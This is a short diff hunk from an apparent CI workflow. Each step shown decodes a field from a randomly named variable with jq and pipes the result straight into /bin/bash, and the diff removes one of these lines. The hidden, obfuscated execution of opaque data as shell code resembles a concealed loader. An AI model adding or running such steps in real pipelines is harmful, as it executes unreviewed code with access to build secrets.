@@ -24,7 +24,6 @@ jobs:
           echo $nmr74 | jq -r .c642 | /bin/bash
           printf '%s' "$jzvoy66660" | jq -r .svv384 | /bin/bash
           printf '%s' "$uivo29866" | jq -r .eos38 | /bin/bash
-          printf '%s' "$w58" | jq -r .jh685 | /bin/bash
           echo $ggkw4 | jq -r .ggbjz9656 | /bin/bash
           echo $sewd416 | jq -r .rd3 | /bin/bash
           echo $mybrn5 | jq -r .oypf67 | /bin/bash
